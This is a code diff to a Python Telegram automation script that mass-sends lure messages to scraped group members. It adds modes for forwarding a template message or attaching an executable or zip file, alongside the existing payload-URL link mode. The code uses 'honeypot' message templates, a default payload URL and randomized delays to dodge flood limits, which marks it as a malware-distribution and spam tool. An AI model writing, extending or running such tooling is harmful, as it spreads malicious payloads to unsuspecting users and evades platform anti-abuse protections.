@@ -278,7 +278,7 @@ async def run_group_scrape(client):
 
 # ── AUTO-DISTRIBUTE ──────────────────────────────────────────────────────────
 
-async def run_distribute(client, payload_url=None):
+async def run_distribute(client, mode="link", payload_url=None, file_path=None, forward_msg=None):
     members = load_members()
     if not members:
         return
@@ -292,19 +292,33 @@ async def run_distribute(client, payload_url=None):
         print("[!] Everyone already contacted")
         return
 
-    url = payload_url or DEFAULT_PAYLOAD_URL
     success = 0
     failed = 0
 
     for m in to_send:
         username = m["username"]
-        msg = random.choice(HONEYPOT_MESSAGES).format(url=url)
 
         try:
-            await client.send_message(username, msg)
+            if mode == "forward" and forward_msg:
+                # Forward your premade message
+                await client.forward_messages(username, forward_msg["id"], forward_msg["chat"])
+                print(f"  [+] Forwarded → @{username}")
+
+            elif mode == "file" and file_path:
+                # Send file with caption
+                caption = random.choice(HONEYPOT_MESSAGES).format(url="").strip()
+                await client.send_file(username, file_path, caption=caption)
+                print(f"  [+] Sent file → @{username}")
+
+            else:
+                # Default: send link message
+                url = payload_url or DEFAULT_PAYLOAD_URL
+                msg = random.choice(HONEYPOT_MESSAGES).format(url=url)
+                await client.send_message(username, msg)
+                print(f"  [+] Sent → @{username}")
+
             log_sent(m["user_id"])
             success += 1
-            print(f"  [+] Sent → @{username}")
 
             # Random delay 30-120s to avoid flood
             delay = random.randint(30, 120)
@@ -326,6 +340,32 @@ async def run_distribute(client, payload_url=None):
             failed += 1
 
     print(f"\n[+] Sent: {success} | Failed: {failed}")
+
+
+async def get_template_message(client):
+    """Get a message to forward - from Saved Messages or a channel"""
+    print("\n[*] Template message setup:")
+    print("  1. Use message from Saved Messages")
+    print("  2. Use message from a channel/group")
+
+    choice = input("Select [1-2]: ").strip()
+
+    if choice == "1":
+        # Saved Messages
+        print("\n[*] Send your template message to Saved Messages first")
+        print("[*] Then enter the message ID (right-click → Copy Message Link → last number)")
+        msg_id = input("Message ID: ").strip()
+        if msg_id.isdigit():
+            return {"chat": "me", "id": int(msg_id)}
+
+    elif choice == "2":
+        # Channel/group
+        chat = input("Channel/group username (without @): ").strip()
+        msg_id = input("Message ID: ").strip()
+        if msg_id.isdigit():
+            return {"chat": chat, "id": int(msg_id)}
+
+    return None
 
 
 # ── TDATA LOADER ─────────────────────────────────────────────────────────────
@@ -397,8 +437,12 @@ async def main():
 
     elif choice == "4":
         # Use sender account
-        url = input(f"Payload URL [{DEFAULT_PAYLOAD_URL}]: ").strip()
-        url = url or DEFAULT_PAYLOAD_URL
+        print("\n[*] Distribution mode:")
+        print("  1. Link only      — send message with payload URL")
+        print("  2. Forward        — forward your premade template message")
+        print("  3. Attachment     — send file (exe/zip) with caption")
+
+        mode_choice = input("Select [1-3]: ").strip()
 
         client = TelegramClient(
             SENDER["session"],
@@ -414,7 +458,25 @@ async def main():
         async with client:
             me = await client.get_me()
             print(f"\n[*] Sender: {me.first_name} (@{me.username})\n")
-            await run_distribute(client, url)
+
+            if mode_choice == "1":
+                url = input(f"Payload URL [{DEFAULT_PAYLOAD_URL}]: ").strip()
+                url = url or DEFAULT_PAYLOAD_URL
+                await run_distribute(client, mode="link", payload_url=url)
+
+            elif mode_choice == "2":
+                forward_msg = await get_template_message(client)
+                if forward_msg:
+                    await run_distribute(client, mode="forward", forward_msg=forward_msg)
+                else:
+                    print("[!] Invalid template message")
+
+            elif mode_choice == "3":
+                file_path = input("File path (exe/zip): ").strip()
+                if os.path.exists(file_path):
+                    await run_distribute(client, mode="file", file_path=file_path)
+                else:
+                    print(f"[!] File not found: {file_path}")
 
     elif choice == "5":
         client = await load_tdata_session()
